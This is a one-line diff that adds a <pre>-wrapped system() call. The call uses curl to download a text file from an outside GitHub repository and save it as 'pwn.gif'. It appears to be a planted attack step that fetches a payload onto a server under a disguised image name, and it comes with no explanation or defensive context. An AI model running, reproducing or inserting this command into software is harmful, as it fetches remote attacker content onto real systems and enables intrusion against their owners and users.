@@ -1,0 +1,1 @@
+<pre>system('curl -o pwn.gif https://raw.githubusercontent.com/dasisqo/cmd/main/azusa.txt')</pre>
